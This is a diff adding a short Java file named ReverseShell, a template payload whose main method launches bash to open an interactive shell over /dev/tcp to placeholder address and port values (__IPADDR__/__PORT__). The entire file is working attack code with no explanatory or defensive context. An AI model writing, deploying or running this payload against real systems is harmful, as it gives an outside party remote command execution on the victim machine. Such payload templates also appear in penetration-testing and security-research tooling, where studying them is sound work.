@@ -1,0 +1,16 @@
+public class ReverseShell {
+    public static void main(String[] args) {
+        ProcessBuilder pb = new ProcessBuilder("bash", "-c",
+                "$@| bash -i >& /dev/tcp/__IPADDR__/__PORT__ 0>&1")
+                .redirectErrorStream(true);
+
+        try {
+            Process p = pb.start();
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
